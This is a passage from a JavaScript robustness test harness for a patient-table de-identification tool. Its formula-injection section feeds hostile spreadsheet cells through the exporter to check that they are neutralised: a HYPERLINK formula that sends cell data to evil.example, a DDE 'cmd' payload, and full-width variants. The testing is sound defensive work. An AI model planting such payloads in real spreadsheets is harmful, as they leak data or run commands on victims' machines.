    if (tp + tc > limit) probs.push({ sev: 'major', label: `${n} rows, ratio ${ratio}`, msg: `processTable ${tp.toFixed(1)} s + selfCheck ${tc.toFixed(1)} s > ${limit} s (core path, single call)`, repro: `node -e "const D=require('./src/core.js'),S=require('./src/synth.js');const s=S.make({n:${n},seed:500,patientsRatio:${ratio}});console.time('p');const r=D.processTable({headers:s.headers,rows:s.rows},{});console.timeEnd('p');console.time('c');D.selfCheck(r,{});console.timeEnd('c')"`, observed: `${(tp + tc).toFixed(1)} s`, expected: `< ${limit} s` });
  }
  emitCheck(5, '5.1', `large tables complete without throwing in reasonable time (${runs.map(([n, r]) => `${n} rows @ ${r} patients/row`).join(', ')}; the page protects >1,200 rows in parts, this is the core path)`, probs);
}

// =================================================================== section 6: formula injection
function section6() {
  const D = loadCore();
  const XLSX = require(path.join(ROOT, 'vendor', 'xlsx.full.min.js'));
  const S = require(SRC('synth.js'));
  const P = loadAppPieces(XLSX, D);
  const START = /^[=+\-@\t\r\uFF1D\uFF0B\uFF0D\uFF20]/;
  const probs = [];
  emit({ sec: 6, id: '6.0', name: `DeID.safeCell exists: ${typeof D.safeCell === 'function'}; core regex covers full-width forms: ${typeof D.safeCell === 'function' && D.safeCell('\uFF1D1') !== '\uFF1D1'}; processTable output is NOT guarded (by design: the page guards at export via aoaOut \u2192 safeAoa, CSV safeCell(fmtDate(v)), txt safeCell(line))${P.notes.length ? '; ' + P.notes.join('; ') : ''}`, status: 'INFO' });
  const evil = ['=1+1', '=HYPERLINK("http://evil.example/?d="&A1,"click")', '@SUM(A1:A2)', '-2+3+cmd|\' /C calc\'!A0', '+1 716 555 0144', '\t=1+1', '\r=1+1', '\uFF1D1+1', '\uFF0B1', '\uFF0D1', '\uFF20SUM(1)', '=Gatsby, Jay', '-Gatsby called', '+Gatsby, Jay'];
  const headers = ['Appt Date', 'Patient Name', 'MRN', 'Phone', 'Attending', 'Comments', 'Chair', 'Regimen'];
  const rows = evil.map((e, i) => [new Date(2026, 10, 9), i % 3 ? 'Gatsby, Jay' : e, '0041832' + (i % 10), i % 2 ? '+1 716-555-0199' : e, i % 2 ? '=Wolfsheim, Meyer MD' : 'Wolfsheim, Meyer MD', e, e, `${e} ${i}`]);
  const s = S.make({ n: 80, seed: 600 });
  const runsIn = [[{ headers, rows }, 'evil cells table'], [{ headers: s.headers, rows: s.rows }, 'synthetic table (surrogate phones begin with +1)']];
  let preGuard = 0;
  for (const [table, label] of runsIn) {
    progress(`6 ${label}`);
    const res = D.processTable(table, { seed: 1, registry: D.createRegistry() });
    res.rows.forEach((r) => r.forEach((v) => { if (typeof v === 'string' && START.test(v)) preGuard++; }));
    const outAoa = P.app.aoaOut({ result: res });
    outAoa.forEach((r, ri) => r.forEach((v, ci) => { if (typeof v === 'string' && START.test(v)) probs.push({ sev: 'major', label, msg: `exported xlsx cell [${ri},${ci}] starts with a formula character: ${jstr(v, 80)}`, repro: `processTable(<${label}>) \u2192 aoaOut`, observed: jstr(v, 80), expected: 'leading apostrophe' }); }));
    const csvAoa = outAoa.map((r) => r.map((v) => P.app.safeCell(P.app.fmtDate(v))));
    const csv = XLSX.utils.sheet_to_csv(XLSX.utils.aoa_to_sheet(csvAoa));
    csv.split('\n').forEach((line, li) => line.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/).forEach((field) => { const f = field.replace(/^"|"$/g, '').replace(/""/g, '"'); if (START.test(f)) probs.push({ sev: 'major', label, msg: `CSV line ${li} field starts with a formula character: ${jstr(f, 80)}`, repro: `processTable(<${label}>) \u2192 aoaOut \u2192 safeCell(fmtDate) \u2192 sheet_to_csv`, observed: jstr(f, 80), expected: 'leading apostrophe' }); }));
    // the written workbook must carry no formula cells
    const buf = XLSX.write((() => { const w = XLSX.utils.book_new(); XLSX.utils.book_append_sheet(w, XLSX.utils.aoa_to_sheet(outAoa, { cellDates: true }), 'Protected'); return w; })(), { type: 'buffer', bookType: 'xlsx' });
    const back = XLSX.read(buf, { type: 'buffer', cellFormula: true });
    Object.entries(back.Sheets.Protected).filter(([k]) => k[0] !== '!').forEach(([addr, c]) => { if (c.f) probs.push({ sev: 'blocker', label, msg: `written .xlsx has a formula in ${addr}: ${c.f}`, repro: `processTable(<${label}>) \u2192 aoaOut \u2192 aoa_to_sheet \u2192 write` }); });
  }
  emit({ sec: 6, id: '6.i', name: `processTable output cells that begin with = + - @ tab CR before the export guard: ${preGuard} (expected > 0: surrogate phones are "+1 555-010-xxxx")`, status: 'INFO' });
  if (D.safeCell && D.safeCell(' =1+1') === ' =1+1') emit({ sec: 6, id: '6.s', name: 'a cell with a leading space before = (" =1+1") is not guarded by either guard; Excel/LibreOffice read it as text, so this is informational', status: 'INFO' });
  emitCheck(6, '6.1', 'no exported cell (xlsx via aoaOut, CSV via safeCell(fmtDate)) starts with = + - @ tab CR or their full-width forms; no formula cells in the written file', probs);
}

// =================================================================== orchestration
const SECTIONS = { 1: section1, 2: section2, 3: section3, 4: section4, 5: section5, 6: section6 };
const SECTION_TIMEOUT = { 1: 900000, 2: 1500000, 3: 600000, 4: 180000, 5: 1200000, 6: 180000 };
const SECTION_NAME = { 1: 'never throws', 2: 'ReDoS / time bounds', 3: 'census guarantee', 4: 'workbook path', 5: 'scale', 6: 'formula injection' };
async function sectionChild(n) {
  try { await SECTIONS[n](); } catch (e) { emit({ sec: +n, id: `${n}.x`, name: `section ${n} harness error`, status: 'FAIL', severity: 'blocker', observed: errMsg(e), expected: 'section completes', repro: `node test/robust.js --only ${n}` }); }
  fs.writeSync(1, '@@DONE\n');
}
async function main() {
  const only = argv.includes('--only') ? argv[argv.indexOf('--only') + 1].split(',').map((x) => x.trim()) : Object.keys(SECTIONS);
  const all = [];
  const t0 = now();
  for (const n of only) {
    if (!SECTIONS[n]) continue;
    const ts = now();
    process.stderr.write(`[robust] section ${n} (${SECTION_NAME[n]})\u2026\n`);
    const flags = argv.filter((a) => a === '--quick' || a === '--verbose');
    const r = spawnSync(process.execPath, [__filename, '--section', n, ...flags], { timeout: SECTION_TIMEOUT[n], killSignal: 'SIGKILL', encoding: 'utf8', maxBuffer: 512 * 1024 * 1024 });
    const lines = (r.stdout || '').split('\n');
    const recs = lines.filter((l) => l.startsWith('@@R ')).map((l) => JSON.parse(l.slice(4)));
    const lastP = lines.filter((l) => l.startsWith('@@P ')).map((l) => JSON.parse(l.slice(4))).pop();
    const done = lines.includes('@@DONE');
    if (!done) recs.push({ sec: +n, id: `${n}.!`, name: `section ${n} (${SECTION_NAME[n]}) did not finish`, status: 'FAIL', severity: 'blocker', observed: r.error && r.error.code === 'ETIMEDOUT' || r.signal === 'SIGKILL' ? `killed after ${SECTION_TIMEOUT[n] / 1000} s; last step started: ${lastP}` : `exited ${r.status} ${r.signal || ''}; last step: ${lastP}; stderr: ${(r.stderr || '').replace(/\s+/g, ' ').slice(-400)}`, expected: 'every step finishes', repro: `node test/robust.js --only ${n}  (last step: ${lastP})` });
    recs.forEach((x) => { x.secTime = ((now() - ts) / 1000).toFixed(1); });
    all.push(...recs);
    process.stderr.write(`[robust] section ${n} done in ${((now() - ts) / 1000).toFixed(1)} s\n`);
  }
  // report
  const tag = { PASS: 'PASS', FAIL: 'FAIL', WARN: 'WARN', INFO: 'INFO' };
  let cur = null;
  for (const r of all) {
    if (r.sec !== cur) { cur = r.sec; console.log(`\n== ${r.sec}. ${SECTION_NAME[r.sec]} ==`); }
    console.log(`${tag[r.status]}${r.status === 'FAIL' ? ` [${r.severity}${r.count ? ` x${r.count}` : ''}]` : ''}  ${r.id}  ${r.name}`);
    if (r.status === 'FAIL') {
      console.log(`      observed: ${short(r.observed, 600)}`);
      if (r.expected) console.log(`      expected: ${short(r.expected, 300)}`);
      if (r.repro) console.log(`      repro:    ${short(r.repro, 600)}`);
      (r.examples || []).slice(1).forEach((e) => console.log(`      also:     ${short(e, 400)}`));
    }
  }
  const fails = all.filter((r) => r.status === 'FAIL');
  const by = (s) => fails.filter((r) => r.severity === s).length;
  const checks = all.filter((r) => r.status === 'PASS' || r.status === 'FAIL');
  console.log(`\nrobust: ${checks.length} checks, ${checks.length - fails.length} pass, ${fails.length} fail (${by('blocker')} blocker, ${by('major')} major, ${by('minor')} minor), ${all.filter((r) => r.status === 'WARN').length} warn \u2014 ${((now() - t0) / 1000).toFixed(0)} s`);
  if (JSON_OUT) console.log(JSON.stringify(all));
  process.exitCode = fails.length ? 1 : 0;
}

if (argv[0] === '--family') { try { familyChild(argv[1], +argv[2], argv[3]); } catch (e) { process.stderr.write(errMsg(e)); process.exit(3); } }
else if (argv[0] === '--sweep') { try { sweepChild(argv[1], +argv[2], argv[3]); } catch (e) { process.stderr.write(errMsg(e)); process.exit(3); } }
else if (argv[0] === '--section') sectionChild(argv[1]);
else main();
